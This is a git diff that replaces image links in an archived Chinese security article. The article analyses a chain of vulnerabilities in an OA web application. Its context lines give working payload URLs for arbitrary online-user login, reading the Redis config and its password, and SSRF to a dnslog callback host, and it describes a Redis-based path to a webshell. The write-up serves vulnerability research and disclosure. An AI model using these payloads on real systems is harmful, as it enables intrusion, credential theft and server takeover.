@@ -49,7 +49,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/97UTw_gS-skIYpN3q9Jakg)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW645Awh5Uw6ic0ezf8jXIl77LS3FfS4kyibZiaF1G7Rib4xZntBBJR7iaonIib1z1sUU9w11UoIZZAO7Vjg/640?wx_fmt=png)
+![](../../.resource/remote/f772b853ea744baf56de5cdd54197105996b3000e469f91ff4f1413ddeac70d3.png)
 
 **01 漏洞简介**
 
@@ -65,7 +65,7 @@ schema_version: "1"
 
 需用户在线
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW645Awh5Uw6ic0ezf8jXIl77LS3FfS4kyibZiaF1G7Rib4xZntBBJR7iaonIib1z1sUU9w11UoIZZAO7Vjg/640?wx_fmt=png)
+![](../../.resource/remote/f772b853ea744baf56de5cdd54197105996b3000e469f91ff4f1413ddeac70d3.png)
 
 **02 漏洞组合拳分析：**
 
@@ -75,19 +75,19 @@ schema_version: "1"
 
 这里 if 判断变量 $isAvatar 是否等于 1，并且 $uid 和 $P_VER 不能为空，满足则进入 if 分支，然后将 $uid 和 $P_VER 作为条件带入数据库中 user_online 表中查询，然后将结果数组中的 "SID" 赋值给 $P
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjaAMz1ctv6P5OMY6jOdibaxckztK8ic3BcEKvyft46nEP34MxCianH6iarw/640?wx_fmt=png)
+![](../../.resource/remote/b9c87a0187a4605028c12312de2bf15b9d29016714a63caff5b48adb9ff54ded.png)
 
 当用户不在线时，数据库中会查询不到数据，则 $P 会没有值，然后会调用 relogin() 函数并且执行 exit 退出程序
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjRy6y6XKLmwG3BqW5BeyZiaeBoSdnDHjRiauFbhhq7ObVT1ZkMnicyicolw/640?wx_fmt=png)
+![](../../.resource/remote/f23be0193649c235f5dac7b9e14581e3782f8c7bed347167e228cacfe1569578.png)
 
 relogin() 函数就是 echo 输出一下 "RELOGIN" 然后 exit 退出
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjH2RgdSwhsbTcPZxUTm586pwxIWr73ZZcSMWPdAr050a3ulibXic7n70Q/640?wx_fmt=png)
+![](../../.resource/remote/607d109fb890031b90f2328a1b09a1475920cc4831b3e28a2f497742ee50aa0e.png)
 
 接着 41-42 行，这里使用 session_id() 和 session_start() 重新设置当前 SESSION 会话 ID, 并重用现有会话，所以造成了任意在线用户登录漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjMwJHHicWL11ictnNjdeCE8G2eRXDGWiaFaatOkIN6eib9mgGGXGBt6jmjg/640?wx_fmt=png)
+![](../../.resource/remote/535dda105c8499980fdb2fb57a658abe5206a06fe3b50db5d1808cc0350bf450.png)
 
 payload：
 
@@ -99,7 +99,7 @@ http://xxx.com/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
 
 主要看 logPath，$filePath 其实就是日志文件的绝对路径，最后会直接 echo 输出整个结果数组，所以我们可以通过日志文件的绝对路径获取程序的安装路径
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjJJb27q3hwJIhqXhDvbITyCkbxRfB4o61yag9cOA3ON1rzb6HiahrNNQ/640?wx_fmt=png)
+![](../../.resource/remote/d4fc61c027144f4823d59119c0c442d329edf25c51900ae02da6f3fcbb69b589.png)
 
 ③ 任意文件读取漏洞：/ispirit/im/photo.php 关键代码：
 
@@ -133,25 +133,25 @@ http://xxx.com/ispirit/im/photo.php?AVATAR_FILE=D:/MYOA/bin/redis.windows.conf&U
 
 通过判断 $PLATFORM 的值进入不同的 if 分支，当 $PLATFORM 等于 dd 时，将其 foreach 遍历后直接传入 remote_download() 函数执行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjTbU1Iia9NkzRpLHp0LvfZh342lOXC12SicJfKmlyQ8p5sf8PibaPfS1icQ/640?wx_fmt=png)
+![](../../.resource/remote/71c5a4254bdbb8c989c172471e993d89416c0adf3c3ed4f9b6cbfb92241e74d1.png)
 
 跟进 remote_download() 函数：/inc/utility_file.php
 
 1814 行这里实例化了 Curl 类，然后调用类中的 get() 方法，将 $URL 作为参数传入
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5Hj9yqQMR1XhiaFyNHdBz0Tic7CPf3r7l2st9uM4Micv3Nvkd3J4mtHf1c3A/640?wx_fmt=png)
+![](../../.resource/remote/880307de6aba3944a3e1a86cec1e9b541a75c13f87eb534244e1f0740c7dab0f.png)
 
 跟进 Curl 类中的 get() 方法：/inc/curl.class.php
 
 这里首先判断传入的 $url 是否是数组，是就执行一些赋值操作，然后通过调用类中的方法设置一些参数，然后调用 exec() 方法执行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5Hj5wkATBH6sLISzjAOib4lTEGY5LFkyIvylDVA0DIpzt9bnTXraxRLicNA/640?wx_fmt=png)
+![](../../.resource/remote/5cfda8ece0357a634da6cdf61c6da0f347c3367979f762f8f0e9b05fb179d9e1.png)
 
 跟进 exec() 方法：
 
 这里会调用原生的 curl_exec() 执行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjQMwnOW7Tdxibx4p3XXfr4rSjrdvq4cwxecWR3ZakalKaicnB71WbiaIzg/640?wx_fmt=png)
+![](../../.resource/remote/685970a16611cf0ee0f8e06f4277cc263896ee06a3b847a2c3d3dcadeb334d13.png)
 
 payload：
 
@@ -159,7 +159,7 @@ payload：
 http://xxx.com/pda/workflow/img_download.php?PLATFORM=dd&ATTACHMENTS=http://xxx.dnslog.cn
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW645Awh5Uw6ic0ezf8jXIl77LS3FfS4kyibZiaF1G7Rib4xZntBBJR7iaonIib1z1sUU9w11UoIZZAO7Vjg/640?wx_fmt=png)
+![](../../.resource/remote/f772b853ea744baf56de5cdd54197105996b3000e469f91ff4f1413ddeac70d3.png)
 
 **03 漏洞复现：**
 
@@ -167,29 +167,29 @@ http://xxx.com/pda/workflow/img_download.php?PLATFORM=dd&ATTACHMENTS=http://xxx.
 
 1、任意在线用户登录：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjdDqIfOC93JCZIffYMibVhvoysHiaVt6jLpRNxkcN5ILbrdcfjGdVST4Q/640?wx_fmt=png)
+![](../../.resource/remote/c071d0435b82d125015a3e882e793df0b61a3b174d762c71f85b8ca809b9b2cf.png)
 
 2、获取安装绝对路径：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjzuibYc6AZk8D6yxMgCZicphZF2VvTusjqJQ4iapXIDQic50HIwzydbVyibg/640?wx_fmt=png)
+![](../../.resource/remote/2a6121611ac7d73c7b80cabddfa3fe670c9d390904e665a47203d9246b0185bb.png)
 
 3、读取 redis 配置文件：
 
 获取 redis 密码：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjCR930VbDQkQQk0ywzVnicictcATyrzdicl0a2dibLu0BHjc493o8I1fyfw/640?wx_fmt=png)
+![](../../.resource/remote/0fd65844ca4986f5f1f2fc0d63647b462d5cbe59705db37aa42e51e3bb391953.png)
 
 获取绑定的端口信息：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5Hj6niappvTNaIrIeOns41EicMoZyicPypMS8aBcXwM29XmqFQytED4icqJgQ/640?wx_fmt=png)
+![](../../.resource/remote/3d3f17a6ba95c739b15fe831b3c51223b9fa89d782b0c77935d0868e6f242419.png)
 
 4、ssrf 漏洞验证：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5Hjm8cy0Hty4nKBeoc9gA2t5OMctSb9iaEuPYy2pZGqrEroKT0UMSNEjvQ/640?wx_fmt=png)
+![](../../.resource/remote/976e6b77ed37d3f3a9b5539d07235e5f8dfa0e67db53dcdb11b2393d44432442.png)
 
 dnslog 收到请求：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjdLEAYDcJyehmac5VvxWsiaf0FVMJBETqLCrXbOict6fX5zalx93CWGXQ/640?wx_fmt=png)
+![](../../.resource/remote/ec3a5f33e07b23691d0421e708f534daa5be9cfb0c804385fdcf2e1dda5de6d5.png)
 
 5、SSRF 配合 Redis -> Getshell
 
@@ -239,15 +239,15 @@ if __name__=="__main__":
 
 执行获取 payload：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5Hjesezs7YGgwKMOPMVawPSRbf4icRicMC6w5t3ahNAyTqLvgT08qdW4ZTA/640?wx_fmt=png)
+![](../../.resource/remote/68402548b98947c5b3766e9fbfae7342584209a8613e3a3d730defcf54888dd9.png)
 
 然后利用 ssrf 漏洞发送 payload：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5HjWWsDGySS4yO8GacMrJ65CVKzGwVFS5dsL9Qua38JZfahOjEYkKMOhQ/640?wx_fmt=png)
+![](../../.resource/remote/c0aeeb42d87cf709e676bcc7d334e2ce8e1f781e412ffd2ccb3a711f19ad4b51.png)
 
 连接 webshell：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW4qtCo5XwiaW3QI4Qkpwk5Hjq6ZX0mVHS86SCOxBmEloG0nhtqAP8vqJYAX5V6iaibd9zbIs3TXarHNg/640?wx_fmt=png)
+![](../../.resource/remote/7778544248f77ee802ac875eef576ee4e14e841291960a4d232c087ca8fceab0.png)
 
 **漏洞组合拳第一部分就分析到这里，后续还有另一个漏洞组合拳，也挺有意思的，文笔浅显，如有错误欢迎各位师傅们交流提出**
 
